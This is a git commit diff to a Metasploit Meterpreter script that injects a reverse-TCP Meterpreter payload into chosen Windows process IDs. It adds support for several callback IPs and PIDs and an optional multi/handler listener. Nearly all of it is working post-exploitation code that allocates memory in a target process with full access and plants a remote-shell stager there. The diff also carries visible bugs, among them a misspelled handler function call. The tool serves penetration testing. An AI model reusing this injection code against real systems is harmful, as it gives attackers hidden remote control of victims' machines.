60dcbcaa45439d9b5d88c752a395998fa23b76b0
Carlos Perez <carlos_perez@darkoperator.com>
2010-10-26 01:30:58 +0000

    can now specify different versions of Reverse Meterpreter, multiple IPs and PIDs for multiple connections back, handler creation is now optional. Thanks to scriptjunkie for his duplicate script, this script is based on his work.
    git-svn-id: file:///home/svn/framework3/trunk@10824 4d416f70-5f16-0410-b530-b9f4589650da

--- scripts/meterpreter/meter_inject.rb
+++ scripts/meterpreter/meter_inject.rb
@@ -5,19 +5,26 @@
 ################## Variable Declarations ##################
 
 @client = client
-rhost    = Rex::Socket.source_address("1.2.3.4")
-rport    = 4546
+lhost    = Rex::Socket.source_address("1.2.3.4")
+lport    = 4444
 lhost    = "127.0.0.1"
 pid = nil
 proc_name = nil
-multi_ip = []
+multi_ip = nil
+multi_pid = []
+payload_type = "windows/meterpreter/reverse_tcp"
+start_handler = nil
 @exec_opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "Help menu." ],
 	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4546)"],
 	"-P"  => [ true,   "PID to inject to if process name not used."],
-	"-t"  => [ true,   "Name of the process to inject to if PID not given."]
-	)
+	"-t"  => [ true,   "Name of the process to inject to if PID not given."],
+	"-m"  => [ false,  "Start Exploit multi/hadler for return connection"],
+	"-pt" => [ true,   "Specify Reverse Connection Meterpreter Payload. Default windows/meterpreter/reverse_tcp"],
+	"-mr" => [ true,   "Provide Multiple IP Addresses for Connections separated by comma."],
+	"-mp" => [ true,   "Provide Multiple PID for connections separated by comma one per IP."]
+)
 meter_type = client.platform
 
 ################## Function Declarations ##################
@@ -67,7 +74,7 @@ end
 def inject(target_pid, payload_to_inject)
 	print_status("Injecting meterpreter into process ID #{target_pid}")
 	begin
-		host_process = @client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+		host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
 		raw = payload_to_inject.generate
 		mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 
@@ -78,8 +85,36 @@ def inject(target_pid, payload_to_inject)
 		print_good("Successfully injected Meterpreter in to process: #{target_pid}")
 	rescue::Exception => e
 		print_error("Failed to Inject Payload to #{target_pid}!")
-		print_error("Error: #{e.class} #{e}")
+		print_error(e)
 	end
+end
+
+# Function for Creation of Connection Handler
+#-------------------------------------------------------------------------------
+def create_multi_handler(payload_to_inject)
+	mul = @client.framework.exploits.create("multi/handler")
+	mul.share_datastore(payload_to_inject.datastore)
+	mul.datastore['WORKSPACE'] = @client.workspace
+	mul.datastore['PAYLOAD'] = payload_to_inject
+	mul.datastore['EXITFUNC'] = 'process'
+	mul.datastore['ExitOnSession'] = true
+	print_status("Running payload handler")
+	mul.exploit_simple(
+		'Payload'  => mul.datastore['PAYLOAD'],
+		'RunAsJob' => true
+	)
+
+end
+
+# Function for Creating the Payload
+#-------------------------------------------------------------------------------
+def create_payload(payload_type,lhost,lport)
+	print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
+	payload = payload_type
+	pay = client.framework.payloads.create(payload)
+	pay.datastore['LHOST'] = lhost
+	pay.datastore['LPORT'] = lport
+	return pay
 end
 
 ################## Main ##################
@@ -88,45 +123,50 @@ end
 	when "-h"
 		usage
 	when "-r"
-		rhost = val
+		lhost = val
 	when "-p"
-		rport = val.to_i
+		lport = val.to_i
 	when "-P"
 		pid = val.to_i
 	when "-t"
 		proc_name = val
+		pid = find_pids(proc_name)
+	when "-m"
+		start_handler = true
+	when "-pt"
+		payload_type = val
+	when "-mr"
+		multi_ip = val.split(",")
+	when "-mp"
+		multi_pid = val.split(",")
 	end
 }
 
 # Check for Version of Meterpreter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
+# Create a Multi Handler is Desired
+create_multi_hadler(payload_type) if start_handler
 
-
-print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")
-
-payload = "windows/meterpreter/reverse_tcp"
-pay = client.framework.payloads.create(payload)
-pay.datastore['LHOST'] = rhost
-pay.datastore['LPORT'] = rport
-mul = client.framework.exploits.create("multi/handler")
-mul.share_datastore(pay.datastore)
-mul.datastore['WORKSPACE'] = client.workspace
-mul.datastore['PAYLOAD'] = payload
-mul.datastore['EXITFUNC'] = 'process'
-mul.datastore['ExitOnSession'] = true
-print_status("Running payload handler")
-mul.exploit_simple(
-	'Payload'  => mul.datastore['PAYLOAD'],
-	'RunAsJob' => true
-)
-
-if proc_name
-	pid = find_pids(proc_name)
-	inject(pid,pay)
-elsif pid
-	inject(pid,pay)
-elsif multi_ip.length > 0
-
+# Check to make sure a PID or Program name where provided
+puts multi_pid.inspect
+puts multi_ip.inspect
+if pid or multi_pid.length > 0
+	if multi_ip.length > 0
+		if multi_ip.length == multi_pid.length
+			pid_index = 0
+			multi_ip.each do |i|
+				payload = create_payload(payload_type,i,lport)
+				inject(multi_pid[pid_index],payload)
+				select(nil, nil, nil, 5)
+				pid_index = pid_index + 1
+			end
+		else
+			print_error("You must provide one PID per IP Address.")
+		end
+	else
+		payload = create_payload(payload_type,lhost,lport)
+		inject(pid,payload)
+	end
 else
-	print_error("You have to specify a process name or a PID of a process to inject in.")
+	print_error("A PID or Process Name must be provided.")
 end
